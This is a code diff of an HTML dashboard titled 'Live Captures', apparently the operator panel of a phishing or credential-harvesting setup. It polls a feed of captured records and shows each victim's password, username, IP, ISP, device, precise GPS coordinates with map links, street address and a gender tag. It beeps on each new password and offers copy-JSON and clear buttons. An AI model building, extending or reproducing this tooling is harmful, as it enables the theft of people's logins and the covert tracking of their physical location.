@@ -139,7 +139,7 @@
 
 </html> -->
 
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html>
 
 <head>
@@ -385,6 +385,366 @@
       return '<div class="pass' + (p ? '' : ' empty') + '">' + (p ? esc(p) : '· · · no password yet · · ·') + '</div>' +
         locLine(c) +
         '<div class="meta"><b>' + esc(c.uid) + '</b> via ' + esc(c.src) + (c.username ? ' · ' + esc(c.username) : '') + '<br>' +
+        'IP: ' + esc(c.ip || '-') + (c.ipIsp ? ' · ' + esc(c.ipIsp) : '') + '<br>' +
+        esc(ua.os || '-') + ' · ' + esc(ua.browser || '-') + ' · ' + esc(ua.device || '-') + ' · hits ' + esc(c.hits || 1) + '<br>' +
+        esc(when) + '</div>' +
+        '<details><summary>' + Object.keys(f).length + ' fields</summary><div class="dump">' + rows + '</div></details>' +
+        '<button class="cp" data-copy="' + c.id + '">copy JSON</button>';
+    }
+
+    function upsert(c) {
+      const s = JSON.stringify(c);
+      if (sig.get(c.id) === s) return;
+      sig.set(c.id, s);
+      cache.set(c.id, c);
+
+      let el = els.get(c.id);
+      if (!el) {
+        el = document.createElement('div');
+        el.className = 'card';
+        el.dataset.id = c.id;
+        els.set(c.id, el);
+        feed.prepend(el);
+      }
+      el.innerHTML = html(c);
+      el.classList.toggle('haspass', !!c.password);
+      el.classList.remove('new');
+      void el.offsetWidth;
+      el.classList.add('new');
+
+      if (c.password && seenPw.get(c.id) !== c.password) { seenPw.set(c.id, c.password); beep(); }
+      $('pws').textContent = [...cache.values()].filter(r => r.password).length;
+    }
+
+    async function poll() {
+      try {
+        const r = await fetch('/api/feed?since=' + since);
+        const d = await r.json();
+        $('status').textContent = 'Watching live...';
+        $('total').textContent = d.total;
+        since = d.latest;
+        (d.items || []).forEach(upsert);
+      } catch (e) {
+        $('status').textContent = 'Reconnecting...';
+      }
+    }
+
+    function beep() {
+      try {
+        const a = new (window.AudioContext || window.webkitAudioContext)();
+        const o = a.createOscillator(), g = a.createGain();
+        o.connect(g); g.connect(a.destination);
+        o.frequency.value = 880;
+        o.start(); o.stop(a.currentTime + 0.15);
+      } catch (e) { }
+    }
+
+    feed.addEventListener('click', e => {
+      const b = e.target.closest('[data-copy]');
+      if (!b) return;
+      const rec = cache.get(Number(b.dataset.copy));
+      if (!rec) return;
+      navigator.clipboard.writeText(JSON.stringify(rec, null, 2));
+      b.textContent = 'copied';
+      setTimeout(() => b.textContent = 'copy JSON', 1200);
+    });
+
+    $('clr').addEventListener('click', async () => {
+      await fetch('/api/clear', { method: 'POST' });
+      location.reload();
+    });
+
+    poll();
+    setInterval(poll, 1500);
+  </script>
+</body>
+
+</html> -->
+
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Live Captures</title>
+  <style>
+    body {
+      font-family: monospace;
+      background: #0d0d0d;
+      color: #eee;
+      margin: 0;
+      padding: 16px
+    }
+
+    h2 {
+      color: #fff;
+      margin: 0 0 12px
+    }
+
+    .bar {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      margin-bottom: 16px;
+      font-size: 13px;
+      flex-wrap: wrap
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #0f0;
+      display: inline-block;
+      animation: pulse 1.2s infinite
+    }
+
+    @keyframes pulse {
+
+      0%,
+      100% {
+        opacity: 1
+      }
+
+      50% {
+        opacity: .3
+      }
+    }
+
+    .card {
+      background: #1a1a1a;
+      border-left: 4px solid #333;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-radius: 6px
+    }
+
+    .card.haspass {
+      border-left-color: #ff0
+    }
+
+    .card .pass {
+      color: #666;
+      font-size: 14px;
+      font-weight: bold;
+      word-break: break-all
+    }
+
+    .card.haspass .pass {
+      color: #ff0;
+      font-size: 20px
+    }
+
+    .gbadge {
+      display: inline-block;
+      margin-left: 6px;
+      padding: 1px 8px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: .02em;
+      background: #1f2a44;
+      color: #8ab4ff;
+      border: 1px solid #2b3b5e
+    }
+
+    .gbadge.f {
+      background: #3a1f33;
+      color: #ff9ed0;
+      border-color: #5a2b4c
+    }
+
+    .gbadge.o {
+      background: #2c2a1c;
+      color: #ffd479;
+      border-color: #4d4726
+    }
+
+    .gbadge.s {
+      background: #262626;
+      color: #999;
+      border-color: #3a3a3a
+    }
+
+    .loc {
+      margin-top: 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 3px
+    }
+
+    .loc .pin {
+      font-size: 12px
+    }
+
+    .loc .pin a {
+      color: #6cf;
+      text-decoration: none
+    }
+
+    .loc .pin.gps {
+      color: #9f9
+    }
+
+    .loc .pin.gps a {
+      color: #6f6
+    }
+
+    .loc .pin.ip a {
+      color: #8ad
+    }
+
+    .loc .pin i {
+      color: #777;
+      font-style: normal
+    }
+
+    .card .meta {
+      color: #888;
+      font-size: 12px;
+      margin-top: 8px;
+      word-break: break-all;
+      line-height: 1.6
+    }
+
+    .card .meta b {
+      color: #eee
+    }
+
+    details {
+      margin-top: 8px
+    }
+
+    summary {
+      cursor: pointer;
+      color: #6cf;
+      font-size: 12px;
+      outline: none
+    }
+
+    .dump {
+      margin-top: 6px;
+      font-size: 11px;
+      color: #999;
+      max-height: 280px;
+      overflow: auto;
+      background: #111;
+      padding: 8px;
+      border-radius: 4px
+    }
+
+    .dump div {
+      display: flex;
+      gap: 8px;
+      padding: 1px 0
+    }
+
+    .dump span:first-child {
+      color: #666;
+      flex: 0 0 34%
+    }
+
+    .dump span:last-child {
+      word-break: break-all;
+      color: #bbb
+    }
+
+    .cp {
+      margin-top: 8px;
+      background: #222;
+      color: #9c9;
+      border: 1px solid #333;
+      border-radius: 4px;
+      font-size: 11px;
+      padding: 4px 8px;
+      cursor: pointer
+    }
+
+    .new {
+      animation: flash 1.2s
+    }
+
+    @keyframes flash {
+      from {
+        background: #0a3d0a
+      }
+
+      to {
+        background: #1a1a1a
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="bar">
+    <span class="dot"></span>
+    <b id="status">Watching live...</b>
+    <span style="color:#666">| records: <span id="total">0</span> | passwords: <span id="pws">0</span></span>
+    <button class="cp" id="clr" style="margin-left:auto">clear</button>
+  </div>
+  <div id="feed"></div>
+
+  <script>
+    const $ = s => document.getElementById(s);
+    const feed = $('feed');
+    let since = 0;
+    const cache = new Map(), sig = new Map(), els = new Map(), seenPw = new Map();
+
+    const esc = s => String(s == null ? '' : s).replace(/[&<>"]/g, m => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[m]));
+
+    function flat(o, p = '', out = {}) {
+      for (const [k, v] of Object.entries(o || {})) {
+        const key = p ? p + '.' + k : k;
+        if (v && typeof v === 'object' && !Array.isArray(v)) flat(v, key, out);
+        else out[key] = Array.isArray(v) ? v.join(' | ') : v;
+      }
+      return out;
+    }
+
+    const SKIP = new Set(['id', 'sid', 'rev', 'uid', 'src', 'url', 'password', 'ip', 'time', 'created', 'updated', 'hits', 'gender', 'genderAt']);
+
+    const mapLink = (lat, lon, label) =>
+      '<a href="https://www.google.com/maps?q=' + lat + ',' + lon + '" target="_blank" rel="noopener">' + esc(label) + '</a>';
+
+    function locLine(c) {
+      const out = [];
+      const edge = c.geo && c.geo.lat != null && c.geo.lon != null;
+      if (c.geoLat != null && c.geoLon != null) {
+        out.push('<span class="pin gps">◎ GPS ' + mapLink(c.geoLat, c.geoLon,
+          Number(c.geoLat).toFixed(5) + ', ' + Number(c.geoLon).toFixed(5)) +
+          (c.geoAcc ? ' <i>±' + esc(c.geoAcc) + 'm</i>' : '') + '</span>');
+        if (c.addrGps) {
+          out.push('<span class="pin gps"><i>' + esc(c.addrGps) +
+            (c.addrPostcodeGps ? ' · ' + esc(c.addrPostcodeGps) : '') + '</i></span>');
+        }
+      }
+      if (c.ipLat != null && c.ipLon != null) {
+        out.push('<span class="pin ip">◎ IP ' + mapLink(c.ipLat, c.ipLon,
+          Number(c.ipLat).toFixed(4) + ', ' + Number(c.ipLon).toFixed(4)) +
+          (c.ipCity ? ' <i>' + esc(c.ipCity) + (c.ipRegion ? ', ' + esc(c.ipRegion) : '') + '</i>' : '') + '</span>');
+      } else if (edge) {
+        out.push('<span class="pin ip">◎ IP ' + mapLink(c.geo.lat, c.geo.lon,
+          Number(c.geo.lat).toFixed(4) + ', ' + Number(c.geo.lon).toFixed(4)) + '</span>');
+      }
+      return out.length ? '<div class="loc">' + out.join('') + '</div>' : '';
+    }
+
+    function html(c) {
+      const p = c.password || '';
+      const ua = c.uaParsed || {};
+      const when = (c.updated || c.time || '').replace('T', ' ').slice(0, 19);
+      const f = flat(c);
+      const rows = Object.entries(f).filter(([k]) => !SKIP.has(k))
+        .map(([k, v]) => '<div><span>' + esc(k) + '</span><span>' + esc(String(v).slice(0, 400)) + '</span></div>').join('');
+
+      const gk = { Male: '', Female: ' f', Other: ' o', skipped: ' s', timeout: ' s' }[c.gender];
+      const gb = c.gender ? '<span class="gbadge' + (gk == null ? ' s' : gk) + '">' + esc(c.gender) + '</span>' : '';
+
+      return '<div class="pass' + (p ? '' : ' empty') + '">' + (p ? esc(p) : '· · · no password yet · · ·') + '</div>' +
+        locLine(c) +
+        '<div class="meta"><b>' + esc(c.uid) + '</b>' + gb + ' via ' + esc(c.src) + (c.username ? ' · ' + esc(c.username) : '') + '<br>' +
         'IP: ' + esc(c.ip || '-') + (c.ipIsp ? ' · ' + esc(c.ipIsp) : '') + '<br>' +
         esc(ua.os || '-') + ' · ' + esc(ua.browser || '-') + ' · ' + esc(ua.device || '-') + ' · hits ' + esc(c.hits || 1) + '<br>' +
         esc(when) + '</div>' +
